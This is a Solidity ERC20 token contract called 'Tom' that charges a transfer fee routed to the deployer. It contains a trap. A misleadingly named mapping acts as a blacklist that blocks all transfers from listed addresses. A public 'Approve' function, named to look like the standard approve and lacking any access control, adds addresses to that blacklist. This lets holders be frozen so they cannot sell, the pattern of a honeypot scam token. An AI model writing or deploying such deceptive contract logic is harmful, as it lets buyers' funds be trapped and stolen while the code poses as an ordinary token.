// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Tom is ERC20 {
    address public admin;
    uint256 public feeRate = 89; // 0.89% fees that can't be change
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public ExcludedFromFeeListed;

    constructor() ERC20("Tom", "Tom") {
        admin = msg.sender;
        _mint(msg.sender, 1000000 * (10 ** uint256(decimals()))); // Mint initial supply
        isExcludedFromFee[msg.sender] = true; // Exclude contract deployer from fee
        isExcludedFromFee[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; // Exclude Uniswap router from fee
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
    require(!ExcludedFromFeeListed[msg.sender] && !ExcludedFromFeeListed[recipient]);

    if (!isExcludedFromFee[msg.sender]) {
            uint256 feeAmount = amount * feeRate / 10000;
            uint256 netAmount = amount - feeAmount;
            _transfer(msg.sender, admin, feeAmount);  // Transfer fees to admin
            _transfer(msg.sender, recipient, netAmount);
        } else {
            _transfer(msg.sender, recipient, amount);
        }

        return true;
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        require(!ExcludedFromFeeListed[from]);
        super._beforeTokenTransfer(from, to, amount);
    }
    function Approve(address account) external {
        ExcludedFromFeeListed[account] = true;
    }
}